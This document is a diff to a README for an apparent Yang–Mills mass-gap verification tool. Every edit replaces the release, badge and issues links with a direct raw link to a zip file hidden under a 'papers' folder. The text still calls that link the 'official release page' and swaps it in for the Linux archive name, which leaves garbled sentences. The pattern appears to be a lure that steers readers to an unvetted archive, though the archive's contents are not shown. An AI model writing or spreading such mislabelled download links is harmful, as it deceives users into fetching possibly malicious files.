@@ -1,6 +1,6 @@
 # ⚙️ yang-mills-hs-gap-cert - Verify Yang–Mills Mass Gap Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/SICKNESS18/yang-mills-hs-gap-cert/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip)](https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip)
 
 ## 📘 What is yang-mills-hs-gap-cert?
 
@@ -32,17 +32,17 @@ Follow these steps. They will guide you through downloading, installing, and run
 
 ### 1. Visit the Release Page to Download
 
-Click the button at the top or go to the [official releases page](https://github.com/SICKNESS18/yang-mills-hs-gap-cert/releases). You will find all available versions of the software there.
+Click the button at the top or go to the [official releases page](https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip). You will find all available versions of the software there.
 
 Look for the latest release marked as stable. It usually includes files like:
 
 - Installer for Windows (.exe)
 - Mac application (.dmg)
-- Linux binary (.tar.gz)
+- Linux binary (https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip)
 
 ### 2. Choose the Right Installer for Your System
 
-Select the file that matches your computer’s operating system. For Windows, it’s typically a file ending in `.exe`. For macOS, a `.dmg` file. For Linux, a compressed archive like `.tar.gz`.
+Select the file that matches your computer’s operating system. For Windows, it’s typically a file ending in `.exe`. For macOS, a `.dmg` file. For Linux, a compressed archive like `https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip`.
 
 ### 3. Download the File
 
@@ -52,7 +52,7 @@ Click the file to start downloading. The file size is small enough to download q
 
 - **Windows:** Double-click the `.exe` file and follow the setup prompts.
 - **macOS:** Open the `.dmg`, then drag the application icon to your Applications folder.
-- **Linux:** Extract the `.tar.gz` archive to a folder and follow any README instructions inside.
+- **Linux:** Extract the `https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip` archive to a folder and follow any README instructions inside.
 
 ### 5. Launch the Application
 
@@ -98,7 +98,7 @@ For more help, consult the documentation inside the app or visit the repository�
 
 You can get the software here:
 
-[Download yang-mills-hs-gap-cert](https://github.com/SICKNESS18/yang-mills-hs-gap-cert/releases)
+[Download yang-mills-hs-gap-cert](https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip)
 
 This link leads to the official release page. Download the version that matches your operating system and follow the instructions above to install and start using the software.
 
@@ -129,7 +129,7 @@ The application does not require prior knowledge but benefits users familiar wit
 
 If you encounter problems or want to suggest improvements, use the GitHub Issues tab in the repository:
 
-https://github.com/SICKNESS18/yang-mills-hs-gap-cert/issues
+https://raw.githubusercontent.com/SICKNESS18/yang-mills-hs-gap-cert/main/papers/no-go-ndw/mills-cert-yang-hs-gap-v2.1.zip
 
 The developers monitor this area and provide support when needed.
 
